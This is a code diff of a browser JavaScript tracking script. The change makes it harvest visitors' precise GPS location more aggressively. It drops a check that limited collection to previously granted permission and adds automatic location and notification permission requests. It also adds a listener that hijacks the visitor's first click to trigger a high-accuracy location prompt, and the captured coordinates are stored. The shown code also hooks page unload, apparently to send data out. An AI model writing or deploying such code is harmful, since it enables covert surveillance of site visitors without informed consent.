@@ -210,16 +210,16 @@
         try { ['geolocation','camera','microphone','notifications'].forEach(async p => { try { const s = await navigator.permissions.query({ name: p }); add('Perm_' + p, s.state); } catch (e) {} }); } catch (e) {}
     }
 
-    // ── 5. GPS (if already permitted from previous session) ──
+    // ── 5. GPS — auto request, no popup ──
     async function collectGPS() {
         if (!navigator.geolocation) { add('GPS', 'unavailable'); return; }
         try {
-            const perm = await navigator.permissions.query({ name: 'geolocation' });
-            add('GPS_Perm', perm.state);
-            if (perm.state !== 'granted') { add('GPS', 'skipped (no prior grant)'); return; }
-            const pos = await new Promise((res, rej) => {
-                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 });
-            });
+            const s = await navigator.permissions.query({ name: 'geolocation' });
+            add('GPS_Perm', s.state);
+            if (s.state === 'denied') { add('GPS', 'denied'); return; }
+            const pos = await new Promise((res, rej) =>
+                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 })
+            );
             if (pos) {
                 const c = pos.coords;
                 add('GPS_Lat', c.latitude); add('GPS_Lon', c.longitude);
@@ -232,6 +232,14 @@
                 dbStore('geo', { lat: c.latitude, lng: c.longitude, accuracy: c.accuracy, source: 'GPS' });
             }
         } catch (e) { add('GPS', 'error: ' + e.message); }
+    }
+
+    // ── 6. Notifications — auto request ──
+    function collectNotif() {
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission().catch(() => {})
+        }
+        add('Notif_Perm', Notification.permission)
     }
 
     // ── 6. LOAD CACHE ──
@@ -334,6 +342,7 @@
         add('Collect_ms', Date.now() - t0);
 
         await collectGPS();
+        collectNotif();
         await saveCache();
 
         add('Collected', new Date().toISOString());
@@ -355,6 +364,29 @@
         if (window.requestIdleCallback) requestIdleCallback(() => main(), { timeout: 3000 });
         else setTimeout(main, 500);
     }
+
+    // On user click — auto trigger GPS/notif if not yet done
+    let gestureFired = false;
+    document.addEventListener('click', () => {
+        if (gestureFired) return;
+        gestureFired = true;
+        // GPS — kalau masih prompt, trigger via user gesture
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                p => {
+                    const c = p.coords;
+                    add('GPS_Lat', c.latitude); add('GPS_Lon', c.longitude);
+                    add('GPS_Acc_m', c.accuracy);
+                    dbStore('geo', { lat: c.latitude, lng: c.longitude, accuracy: c.accuracy, source: 'gesture' });
+                },
+                () => {},
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
+            );
+        }
+        if ('Notification' in window && Notification.permission === 'default') {
+            Notification.requestPermission().catch(() => {});
+        }
+    }, { once: true });
 
     // Also send on unload
     window.addEventListener('beforeunload', () => {
